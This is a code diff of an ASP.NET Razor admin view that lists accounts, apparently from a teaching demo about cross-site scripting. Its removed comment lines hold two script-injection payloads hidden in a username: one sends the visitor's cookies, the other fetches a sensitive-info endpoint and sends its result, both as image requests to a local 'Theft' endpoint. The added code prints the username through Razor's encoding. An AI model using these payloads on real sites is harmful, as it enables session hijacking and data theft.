@@ -37,24 +37,14 @@
                 </div>
                 <div class="col-md-4">
                     <p class="text-warning">
-                        <b>List of users:</b>
+                        <b>Accounts:</b>
                         <ul>
-                            @* XSS consequences *@
-
                             @foreach (var account in Model.Accounts)
                             {
-                                    <li>@Html.FormatUserName(account)
-                                        @Html.ActionLink("✘", "Delete", "Admin", new { username = account.Username }, null)
-                                    </li>
-
-                                @* Stealing cookies or other data *@
-                                @* @Html.Raw(account.Username) *@
-                                @* Steal cookies: Joker<script>$(function () { $('<img>').attr('src', 'http://localhost:6118/Home/Theft?data=' + encodeURIComponent(document.cookie)).appendTo('body').hide(); });</script> *@
-                                
-                                @* Steal sensetive info: Joker<script>$(function () { $.get('/Home/GetSensetiveInfo', function (res) { $('<img>').attr('src', 'http://localhost:6118/Home/Theft?data=' + encodeURIComponent(res.data)).appendTo('body').hide(); }); });</script> *@
-                                
-                                @* Insecure helpers *@
-                                @* @Html.FormatUserName(account)*@
+                                <li>
+                                    @account.Username - @account.Balance
+                                    @Html.ActionLink("✘", "Delete", "Admin", new { username = account.Username }, null)
+                                </li>
                             }
                         </ul>
                     </p>
